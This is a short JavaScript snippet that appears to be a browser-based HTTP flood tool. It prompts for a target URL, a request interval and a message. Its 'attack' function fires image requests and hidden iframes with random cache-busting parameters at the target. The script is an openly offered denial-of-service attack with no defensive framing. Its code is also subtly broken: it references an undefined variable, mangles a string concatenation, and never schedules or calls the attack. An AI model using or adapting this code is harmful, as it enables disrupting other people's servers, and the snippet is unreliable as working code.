// variables
var target = prompt("Image URL, add / to the end");
var speed = prompt("Make request ever[blank] milliseconds");
var msg = prompt("Message to HTTP server");

// function for attack
function attack() {
    var pic = new Image();
    var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
    var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
    pic.src = 'http://'+target+"/?r="+rand;

    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';

                
}